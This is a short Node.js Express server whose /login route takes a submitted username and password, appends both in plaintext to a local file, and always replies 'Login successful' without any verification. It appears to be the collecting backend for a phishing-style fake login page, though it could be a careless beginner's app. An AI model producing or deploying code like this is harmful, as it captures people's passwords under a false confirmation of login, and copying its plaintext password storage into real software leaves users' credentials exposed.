const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

// Middleware to parse JSON data
app.use(express.json());
app.use(express.static('public'));

// Handle login form submission
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  if (username && password) {
    // Save the user data to a file
    const userData = `Username: ${username}, Password: ${password}\n`;
    fs.appendFile('user_data.txt', userData, (err) => {
      if (err) {
        return res.status(500).json({ success: false, message: 'Error saving data' });
      }
      return res.json({ success: true, message: 'Login successful' });
    });
  } else {
    return res.status(400).json({ success: false, message: 'Invalid input' });
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
